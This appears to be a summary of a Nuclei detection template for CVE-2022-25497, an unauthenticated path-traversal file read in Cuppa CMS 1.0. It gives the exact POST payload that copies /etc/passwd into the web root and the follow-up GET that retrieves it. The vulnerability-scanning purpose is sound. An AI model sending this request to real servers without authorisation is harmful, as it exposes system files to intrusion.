---
cve_id: CVE-2022-25497
template_path: nuclei-templates/http/cves/2022/CVE-2022-25497.yaml
affected_product: Cuppa CMS
severity: medium
authentication: none
external_callback: false
affected_versions: 1.0
preconditions: []
poc_classification: info-leak
---

## Vulnerability
Cuppa CMS 1.0 is affected by an arbitrary file read (LFI) in the file manager copy function at `/js/filemanager/api/index.php`. The `copyFile` action accepts a `from` path that supports path traversal, allowing an unauthenticated remote attacker to read any readable file on the server (e.g., `/etc/passwd`).  
CVSS 3.1: 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) • CWE-552 • Vendor: cuppacms • CPE: cpe:2.3:a:cuppacms:cuppacms:1.0:*:*:*:*:*:*:*

## PoC / Detection
Classification: info-leak  
The template verifies the LFI by:  
1. POST `/js/filemanager/api/index.php` with JSON `{"from":"//../../../../../../../../../../../../../etc/passwd","to":"/../{{randstr}}.txt","action":"copyFile"}` to copy the system passwd file into the web root.  
2. GET `/{{randstr}}.txt` and matching `text/plain` Content-Type, HTTP 200, and the regex `root:.*:0:0:` in the response body.  
The probe is non-destructive (copies only `/etc/passwd`) and confirms the flaw without external interaction.

## References
- https://github.com/CuppaCMS/CuppaCMS
- https://nvd.nist.gov/vuln/detail/CVE-2022-25497
- https://github.com/ARPSyndicate/cvemon
